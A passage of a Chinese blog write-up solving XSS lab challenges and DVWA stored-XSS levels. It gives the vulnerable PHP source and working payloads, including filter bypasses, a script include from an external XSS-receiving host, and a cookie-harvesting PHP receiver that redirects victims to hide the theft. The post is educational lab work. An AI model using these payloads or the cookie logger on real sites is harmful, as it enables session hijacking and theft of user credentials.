alt=\"image-20200828161500548\"></p>\n<p><code>Result</code></p>\n<p><img src=\"/images/XSS/image-20200828161534239.png\" alt=\"image-20200828161534239\"></p>\n<h5 id=\"挑战十二\"><a href=\"#挑战十二\" class=\"headerlink\" title=\"挑战十二\"></a>挑战十二</h5><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//不再是REFERER请求头，现在更换了User-agent</span></span><br><span class=\"line\">&lt;?php </span><br><span class=\"line\">ini_set(<span class=\"string\">&quot;display_errors&quot;</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">$str = $_GET[<span class=\"string\">&quot;keyword&quot;</span>];</span><br><span class=\"line\">$str00 = $_GET[<span class=\"string\">&quot;t_sort&quot;</span>];</span><br><span class=\"line\">$str11=$_SERVER[<span class=\"string\">&#x27;HTTP_USER_AGENT&#x27;</span>];</span><br><span class=\"line\">$str22=str_replace(<span class=\"string\">&quot;&gt;&quot;</span>,<span class=\"string\">&quot;&quot;</span>,$str11);</span><br><span class=\"line\">$str33=str_replace(<span class=\"string\">&quot;&lt;&quot;</span>,<span class=\"string\">&quot;&quot;</span>,$str22);</span><br><span class=\"line\">echo <span class=\"string\">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.htmlspecialchars($str).<span class=\"string\">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class=\"string\">&#x27;&lt;center&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;form id=search&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class=\"string\">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class=\"string\">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.htmlspecialchars($str00).<span class=\"string\">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;input name=&quot;t_ua&quot;  value=&quot;&#x27;</span>.$str33.<span class=\"string\">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;/form&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;/center&gt;&#x27;</span>;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//修改User-agent插入PoC</span><br><span class=\"line\">`User-Agent: &quot; onmouseover=alert(1) type=&quot;text&quot;`</span><br><span class=\"line\">`User-Agent: &quot; onclick=&quot;alert(1) type=&quot;text&quot;`</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/XSS/image-20200828162042253.png\" alt=\"image-20200828162042253\"></p>\n<p><code>Result</code></p>\n<p><img src=\"/images/XSS/image-20200828162112961.png\" alt=\"image-20200828162112961\"></p>\n<h5 id=\"挑战十三\"><a href=\"#挑战十三\" class=\"headerlink\" title=\"挑战十三\"></a>挑战十三</h5><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;修改请求头Cookie来测试</span><br><span class=\"line\">&lt;?php </span><br><span class=\"line\">setcookie(&quot;user&quot;, &quot;call me maybe?&quot;, time()+3600);</span><br><span class=\"line\">ini_set(&quot;display_errors&quot;, 0);</span><br><span class=\"line\">$str &#x3D; $_GET[&quot;keyword&quot;];</span><br><span class=\"line\">$str00 &#x3D; $_GET[&quot;t_sort&quot;];</span><br><span class=\"line\">$str11&#x3D;$_COOKIE[&quot;user&quot;];</span><br><span class=\"line\">$str22&#x3D;str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);</span><br><span class=\"line\">$str33&#x3D;str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);</span><br><span class=\"line\">echo &quot;&lt;h2 align&#x3D;center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;&#x2F;h2&gt;&quot;.&#39;&lt;center&gt;</span><br><span class=\"line\">&lt;form id&#x3D;search&gt;</span><br><span class=\"line\">&lt;input name&#x3D;&quot;t_link&quot;  value&#x3D;&quot;&#39;.&#39;&quot; type&#x3D;&quot;hidden&quot;&gt;</span><br><span class=\"line\">&lt;input name&#x3D;&quot;t_history&quot;  value&#x3D;&quot;&#39;.&#39;&quot; type&#x3D;&quot;hidden&quot;&gt;</span><br><span class=\"line\">&lt;input name&#x3D;&quot;t_sort&quot;  value&#x3D;&quot;&#39;.htmlspecialchars($str00).&#39;&quot; type&#x3D;&quot;hidden&quot;&gt;</span><br><span class=\"line\">&lt;input name&#x3D;&quot;t_cook&quot;  value&#x3D;&quot;&#39;.$str33.&#39;&quot; type&#x3D;&quot;hidden&quot;&gt;</span><br><span class=\"line\">&lt;&#x2F;form&gt;</span><br><span class=\"line\">&lt;&#x2F;center&gt;&#39;;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//修改Cookie</span><br><span class=\"line\">`Cookie: user=call+me+maybe%3F&quot; onmouseover=alert(1) type=&quot;text&quot;`</span><br><span class=\"line\">`Cookie: user=call+me+maybe%3F&quot; onclick=&quot;alert(1) type=&quot;text&quot;`</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/XSS/image-20200828162907084.png\" alt=\"image-20200828162907084\"></p>\n<p><code>Result</code></p>\n<p><img src=\"/images/XSS/image-20200828162927276.png\" alt=\"image-20200828162927276\"></p>\n<h5 id=\"挑战十四\"><a href=\"#挑战十四\" class=\"headerlink\" title=\"挑战十四\"></a>挑战十四</h5><p>网路搜索：</p>\n<p><code>此题主要利用exif xss，链接由于网络的原因无法访问，exif xss，一般利用于文件上传的地方，最经典的就是头像上传，上传一个图片，该图片的exif元数据被修改为xss payload，成功利用弹窗，可利用exiftool工具，命令如下：</code></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//但是因为域名无法访问了，这题后期再更</span><br><span class=\"line\">`exiftool -FIELD=XSS FILENAME`</span><br><span class=\"line\">`exiftool -Artist=&#x27; &quot;&gt;&lt;img src=1 onerror=alert(document.domain)&gt;&#x27; filename.jpeg`</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"挑战十五\"><a href=\"#挑战十五\" class=\"headerlink\" title=\"挑战十五\"></a>挑战十五</h5><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;ng-include是AngularJS中指令，具有文件包含功能&quot;&lt;div ng-include&#x3D;&quot;&#39;myFile.htm&#39;&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class=\"line\">&quot;，和php中include函数类似。可通过src属性来加载以上是挑战任意一个。</span><br><span class=\"line\">&#x2F;&#x2F;这里需要注意，其中远程加载google的js，需要&quot;扶梯子&quot;才行。</span><br><span class=\"line\">&lt;?php </span><br><span class=\"line\">ini_set(&quot;display_errors&quot;, 0);</span><br><span class=\"line\">$str &#x3D; $_GET[&quot;src&quot;];</span><br><span class=\"line\">echo &#39;&lt;body&gt;&lt;span class&#x3D;&quot;ng-include:&#39;.htmlspecialchars($str).&#39;&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;body&gt;&#39;;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//这里包含挑战二来实现XSS</span><br><span class=\"line\">`/level15.php?src=&#x27;level2.php?keyword=&quot;&gt;&lt;img src=x onerror=alert(1)&gt;&#x27;`</span><br></pre></td></tr></table></figure>\n\n<p><code>Result</code></p>\n<p><img src=\"/images/XSS/image-20200828200852458.png\" alt=\"image-20200828200852458\"></p>\n<h5 id=\"挑战十六\"><a href=\"#挑战十六\" class=\"headerlink\" title=\"挑战十六\"></a>挑战十六</h5><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;对变量的值进行script、&#x2F;、空格等替换&amp;nbsp，用%0d，%0a等绕过</span><br><span class=\"line\">&lt;?php </span><br><span class=\"line\">ini_set(&quot;display_errors&quot;, 0);</span><br><span class=\"line\">$str &#x3D; strtolower($_GET[&quot;keyword&quot;]);</span><br><span class=\"line\">$str2&#x3D;str_replace(&quot;script&quot;,&quot;&amp;nbsp;&quot;,$str);</span><br><span class=\"line\">$str3&#x3D;str_replace(&quot; &quot;,&quot;&amp;nbsp;&quot;,$str2);</span><br><span class=\"line\">$str4&#x3D;str_replace(&quot;&#x2F;&quot;,&quot;&amp;nbsp;&quot;,$str3);</span><br><span class=\"line\">$str5&#x3D;str_replace(&quot;\t&quot;,&quot;&amp;nbsp;&quot;,$str4);</span><br><span class=\"line\">echo &quot;&lt;center&gt;&quot;.$str5.&quot;&lt;&#x2F;center&gt;&quot;;</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">&lt;center&gt;&lt;img src&#x3D;level16.png&gt;&lt;&#x2F;center&gt;</span><br><span class=\"line\">&lt;?php </span><br><span class=\"line\">echo &quot;&lt;h3 align&#x3D;center&gt;payload的长度:&quot;.strlen($str5).&quot;&lt;&#x2F;h3&gt;&quot;;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//对字符进行编码</span><br><span class=\"line\">`&lt;img%0dsrc=1%0donerror=alert(16)&gt;`</span><br><span class=\"line\">`&lt;iframe%0dsrc=0%0donmouseover=alert｀16｀&gt;&lt;/iframe&gt;`</span><br><span class=\"line\">`&lt;svg%0aonload=alert｀16｀&gt;&lt;/svg&gt;`</span><br></pre></td></tr></table></figure>\n\n<p><code>Result</code></p>\n<p><img src=\"/images/XSS/image-20200828203522683.png\" alt=\"image-20200828203522683\"></p>\n<h5 id=\"挑战十七\"><a href=\"#挑战十七\" class=\"headerlink\" title=\"挑战十七\"></a>挑战十七</h5><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;加载swf文件，并对两个参数arg01和arg02值进行过滤</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">ini_set(&quot;display_errors&quot;, 0);</span><br><span class=\"line\">echo &quot;&lt;embed src&#x3D;xsf01.swf?&quot;.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;&#x3D;&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).&quot; width&#x3D;100% heigth&#x3D;100%&gt;&quot;;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//使用编码%0a、%0b绕过。</span><br><span class=\"line\">`arg01=123&amp;arg02= onmouseover=alert(1)`</span><br><span class=\"line\">`arg01=123&amp;arg02=%20onmousedown=alert`1``</span><br><span class=\"line\">`arg01=123&amp;arg02=  onmouseover=alert(1) type=&quot;text&quot;`</span><br><span class=\"line\">``/level17.php?arg01=a&amp;arg02=%20onmouseover=alert`1``</span><br></pre></td></tr></table></figure>\n\n<p><code>Result</code></p>\n<p><img src=\"/images/XSS/image-20200828220707491.png\" alt=\"image-20200828220707491\"></p>\n<h5 id=\"挑战十八\"><a href=\"#挑战十八\" class=\"headerlink\" title=\"挑战十八\"></a>挑战十八</h5><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;和挑战十七的试题一致，可直接拿来利用测试</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">ini_set(&quot;display_errors&quot;, 0);</span><br><span class=\"line\">echo &quot;&lt;embed src&#x3D;xsf02.swf?&quot;.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;&#x3D;&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).&quot; width&#x3D;100% heigth&#x3D;100%&gt;&quot;;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//使用编码%0a、%0b绕过。</span><br><span class=\"line\">`arg01=123&amp;arg02= onmouseover=alert(1)`</span><br><span class=\"line\">`arg01=123&amp;arg02=%20onmousedown=alert`1``</span><br><span class=\"line\">`arg01=123&amp;arg02=  onmouseover=alert(1) type=&quot;text&quot;`</span><br><span class=\"line\">`/level17.php?arg01=a&amp;arg02=%20onmouseover=alert`1``</span><br></pre></td></tr></table></figure>\n\n<p><code>Result</code></p>\n<p><img src=\"/images/XSS/image-20200829095926257.png\" alt=\"image-20200829095926257\"></p>\n<h5 id=\"挑战十九\"><a href=\"#挑战十九\" class=\"headerlink\" title=\"挑战十九\"></a>挑战十九</h5><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;此题主要介绍考察Flash XSS</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">ini_set(&quot;display_errors&quot;, 0);</span><br><span class=\"line\">echo &#39;&lt;embed src&#x3D;&quot;xsf03.swf?&#39;.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;&#x3D;&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).&#39;&quot; width&#x3D;100% heigth&#x3D;100%&gt;&#39;;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>直接访问URL</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;xss-lab.me:8888&#x2F;level19.php?arg01&#x3D;a&amp;arg02&#x3D;b</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/XSS/image-20200829104903728.png\" alt=\"image-20200829104903728\"></p>\n<p>swf文件直接输出参数值</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//使用a标签加载javascript协议弹窗</span><br><span class=\"line\">`/level19.php?arg01=version&amp;arg02=&lt;a href=&quot;javascript:alert(&#x27;XSS&#x27;)&quot;&gt;XSS_Click&lt;/a&gt;`</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/XSS/image-20200829105426617.png\" alt=\"image-20200829105426617\"></p>\n<p>点击触发漏洞</p>\n<p><code>Result</code></p>\n<p><img src=\"/images/XSS/image-20200829105522767.png\" alt=\"image-20200829105522767\"></p>\n<h5 id=\"挑战二十\"><a href=\"#挑战二十\" class=\"headerlink\" title=\"挑战二十\"></a>挑战二十</h5><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;网络搜索未找到对应解析此题，只知道此题还是Flash XSS。</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">ini_set(&quot;display_errors&quot;, 0);</span><br><span class=\"line\">echo &#39;&lt;embed src&#x3D;&quot;xsf04.swf?&#39;.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;&#x3D;&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).&#39;&quot; width&#x3D;100% heigth&#x3D;100%&gt;&#39;;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p><code>payload</code></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//使用以下payload可实现，备注参数arg01的值必须是id不然都不弹窗；不理解其意；</span><br><span class=\"line\">`level20.php?arg01=id&amp;arg02=\\&quot;))&#125;catch(e)&#123;&#125;if(!self.a)self.a=!alert(document.cookie)//%26width%26height`</span><br></pre></td></tr></table></figure>\n\n<p><code>Result</code></p>\n<p><img src=\"/images/XSS/image-20200829135137358.png\" alt=\"image-20200829135137358\"></p>\n<p>参考以上学习可简单了解XSS反射型，但如想继续研究建议可网络搜索在线挑战并练习或参考网上Writeup。</p>\n<h4 id=\"存储型-1\"><a href=\"#存储型-1\" class=\"headerlink\" title=\"存储型\"></a>存储型</h4><p>存储型XSS  是指应用程序通过Web请求获取不可信赖的数据，在未检验数据是否存在XSS代码的情况下，便将其存入数据库。当下一次从数据库中获取该数据时程序也未对其进行过滤，页面再次执行XSS代码，存储型XSS可以持续攻击用户。存储型XSS漏洞大多出现在留言板、评论区，用户提交了包含XSS代码的留言到数据库。当目标用户查询留言时，那些留言的内容会从服务器解析之后加载出来。浏览器发现有XSS代码，就当做正常的HTML和JS解析执行，存储型XSS就发生了。</p>\n<p>存储型XSS攻击方式主要是嵌入一段远程或者第三方域上的JS代码，并在目标域执行这些代码。存储型XSS会造成Cookie泄露，破坏页面正常的结构与样式，重定向访问恶意网站等。</p>\n<h5 id=\"搭建接收平台\"><a href=\"#搭建接收平台\" class=\"headerlink\" title=\"搭建接收平台\"></a>搭建接收平台</h5><p>参考下面的<code>cookie.php</code>文件获取网站cookie方式；保存单文件至当前文件夹内；也可以使用互联网上的接收平台<a href=\"https://webxss.top/\">XSS_Top</a></p>\n<h5 id=\"实战\"><a href=\"#实战\" class=\"headerlink\" title=\"实战\"></a>实战</h5><h6 id=\"DVWA-low\"><a href=\"#DVWA-low\" class=\"headerlink\" title=\"DVWA-low\"></a>DVWA-low</h6><p>看到输入框长度有限制，这里可以通过修改JS，或者使用Burpsuite来实现。</p>\n<p><img src=\"/images/XSS/image-20200831171126727.png\" alt=\"image-20200831171126727\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">DVWA-Low</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">if( isset( $_POST[ &#39;btnSign&#39; ] ) ) &#123;</span><br><span class=\"line\">\t&#x2F;&#x2F; Get input</span><br><span class=\"line\">\t$message &#x3D; trim( $_POST[ &#39;mtxMessage&#39; ] );</span><br><span class=\"line\">\t$name    &#x3D; trim( $_POST[ &#39;txtName&#39; ] );</span><br><span class=\"line\">\t&#x2F;&#x2F; Sanitize message input</span><br><span class=\"line\">\t$message &#x3D; stripslashes( $message );</span><br><span class=\"line\">\t$message &#x3D; ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F; Sanitize name input</span><br><span class=\"line\">\t$name &#x3D; ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F; Update database</span><br><span class=\"line\">\t$query  &#x3D; &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#39;$message&#39;, &#39;$name&#39; );&quot;;</span><br><span class=\"line\">\t$result &#x3D; mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res &#x3D; mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;&#x2F;pre&gt;&#39; );</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F;mysql_close();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>截获数据并修改Message的值</p>\n<p><img src=\"/images/XSS/image-20200831171424381.png\" alt=\"image-20200831171424381\"></p>\n<p>接收平台此时会收到Cookie值</p>\n<p><img src=\"/images/XSS/image-20200831171401476.png\" alt=\"image-20200831171401476\"></p>\n<p>浏览器插件添加Cookie值并绕过登录</p>\n<p><img src=\"/images/XSS/image-20200831173056272.png\" alt=\"image-20200831173056272\"></p>\n<p>接收Cookie的php文件</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">$cookie &#x3D; $_GET[&#39;cookie&#39;]; &#x2F;&#x2F;以GET方式获取cookie变量值</span><br><span class=\"line\">$ip &#x3D; getenv (&#39;REMOTE_ADDR&#39;); &#x2F;&#x2F;远程主机IP地址</span><br><span class=\"line\">$time&#x3D;date(&#39;Y-m-d g:i:s&#39;); &#x2F;&#x2F;以“年-月-日 时：分：秒”的格式显示时间</span><br><span class=\"line\">$referer&#x3D;getenv (&#39;HTTP_REFERER&#39;); &#x2F;&#x2F;链接来源</span><br><span class=\"line\">$agent &#x3D; $_SERVER[&#39;HTTP_USER_AGENT&#39;]; &#x2F;&#x2F;用户浏览器类型</span><br><span class=\"line\"></span><br><span class=\"line\">$fp &#x3D; fopen(&#39;cookie.txt&#39;, &#39;a&#39;); &#x2F;&#x2F;打开cookie.txt，若不存在则创建它</span><br><span class=\"line\">fwrite($fp,&quot; IP: &quot; .$ip. &quot;\\n Date and Time: &quot; .$time. &quot;\\n User Agent:&quot;.$agent.&quot;\\n Referer: &quot;.$referer.&quot;\\n Cookie: &quot;.$cookie.&quot;\\n\\n\\n&quot;); &#x2F;&#x2F;写入文件</span><br><span class=\"line\">fclose($fp); &#x2F;&#x2F;关闭文件</span><br><span class=\"line\"></span><br><span class=\"line\">header(&quot;Location: http:&#x2F;&#x2F;www.baidu.com&quot;)&#x2F;&#x2F;重定向到baidu，防止发现</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>直接访问生成cookie.txt文件</p>\n<p><img src=\"/images/XSS/image-20200831183628978.png\" alt=\"image-20200831183628978\"></p>\n<h6 id=\"DVWA-Medium\"><a href=\"#DVWA-Medium\" class=\"headerlink\" title=\"DVWA-Medium\"></a>DVWA-Medium</h6><p>中级和低级比较显示使用部分函数进行过滤。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">addslashes()\t\t\t\t使用反斜线引用字符串</span><br><span class=\"line\">htmlspecialchars()\t将特殊字符转换为 HTML 实体</span><br><span class=\"line\">str_replace()\t\t\t\t子字符串替换</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/XSS/image-20200901112252053.png\" alt=\"image-20200901112252053\"></p>\n<p>抓包绕过</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">`&lt;sc&lt;script&gt;ript&gt;alert(/xss/)&lt;/script&gt;`</span><br><span class=\"line\">大小写绕过</span><br><span class=\"line\">`&lt;Script&gt;alert(/xss/)&lt;/script&gt;`</span><br><span class=\"line\">`&lt;/textarea&gt;&#x27;&quot;&gt;&lt;Script src=https://webxss.top/xss/BjE4XZ?1598931992&gt;&lt;/script&gt;`</span><br></pre></td></tr></table></figure>\n\n<p>弹窗检测</p>\n<p><img src=\"/images/XSS/image-20200901134156567.png\" alt=\"image-20200901134156567\"></p>\n<p><img src=\"/images/XSS/image-20200901134205736.png\" alt=\"image-20200901134205736\"></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">`&lt;img src=1 οnerrοr=alert(1)&gt;`</span><br></pre></td></tr></table></figure>\n\n<h6 id=\"DVWA-high\"><a href=\"#DVWA-high\" class=\"headerlink\" title=\"DVWA-high\"></a>DVWA-high</h6><p>高和中比较发现采用正则表达式对script进行过滤了；但可尝试使用其他标签<img>等</p>\n<p><img src=\"/images/XSS/image-20200901135011353.png\" alt=\"image-20200901135011353\"></p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">`<span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">1</span> <span class=\"attr\">onerror</span>=<span class=\"string\">alert(1)</span>&gt;</span>`</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/XSS/image-20200901140548264.png\" alt=\"image-20200901140548264\"></p>\n<p><img src=\"/images/XSS/image-20200901140610422.png\" alt=\"image-20200901140610422\"></p>\n<h4 id=\"DOM型-2\"><a href=\"#DOM型-2\" class=\"headerlink\" title=\"DOM型\"></a>DOM型</h4><h5 id=\"DVWA-low-1\"><a href=\"#DVWA-low-1\" class=\"headerlink\" title=\"DVWA-low\"></a>DVWA-low</h5><p>low版本不存在任何显示，default参数值设置为payload。</p>\n<figure class=\"highlight plain\"><table><tr><td 